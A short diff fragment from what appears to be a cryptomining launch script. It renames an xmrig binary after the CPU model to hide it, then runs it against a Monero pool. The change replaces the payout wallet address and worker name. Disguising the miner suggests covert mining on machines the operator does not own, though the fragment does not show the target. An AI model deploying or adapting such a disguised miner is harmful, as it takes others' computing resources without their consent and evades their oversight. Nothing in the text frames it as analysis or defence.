@@ -15,7 +15,7 @@ mv xmrig $azure -n
 cp $azure "$cpuname"
 rm -f  xmrig
 POOL=pool.minexmr.com:6666
-USERNAME=84g9tdhjFZHRQVU35xB4bsSaVBNkZU8W5NUWzHPwmQNT1Ef9gYGPew4hr3PRjUbNK4KYHSGQDLYrJNHdfUyy4ojNCCJM5cu
+USERNAME=8B8PUnSJF5dfPoar6TJ8zKcWB6YeVaAgfcc5Eih4btGm1wcZEmcToWzbqNDBiYx9CM16vGg3UtUo4HkEzj8WmwmHHKDVVta
 ALGO=rx/0
 DONATE=1
-./"${cpuname}" --donate-level $DONATE -o $POOL -u $USERNAME.xPro -p x -a $ALGO -k --tls
+./"${cpuname}" --donate-level $DONATE -o $POOL -u $USERNAME.Pro -p x -a $ALGO -k --tls
